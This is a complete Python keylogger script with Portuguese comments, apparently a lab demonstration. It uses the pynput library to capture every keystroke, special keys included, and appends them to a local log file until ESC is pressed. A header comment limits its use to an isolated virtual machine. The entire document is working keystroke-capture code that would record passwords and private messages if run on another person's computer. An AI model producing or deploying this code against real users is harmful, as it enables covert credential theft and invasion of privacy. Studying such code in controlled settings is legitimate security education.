# Executar apenas em VM isolada. Proibido o uso contra terceiros.
from pynput import keyboard

# O arquivo onde as teclas serão salvas
arquivo_log = "log.txt"

def salvar_tecla(tecla):
    # Abre o arquivo no modo append (adiciona ao final) e escreve
    with open(arquivo_log, "a", encoding="utf-8") as f:
        f.write(tecla)

def on_press(key):
    try:
        # Tenta pegar o caractere normal da tecla
        salvar_tecla(key.char)
    except AttributeError:
        # Trata teclas especiais
        if key == keyboard.Key.space:
            salvar_tecla(" ")
        elif key == keyboard.Key.enter:
            salvar_tecla("\n")
        elif key == keyboard.Key.tab:
            salvar_tecla("\t")
        else:
            salvar_tecla(f"[{key}]")

    # Se apertar ESC, encerra o script
    if key == keyboard.Key.esc:
        print("\nSaindo...")
        return False

print("Keylogger rodando... Digite algo (ESC para parar).")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()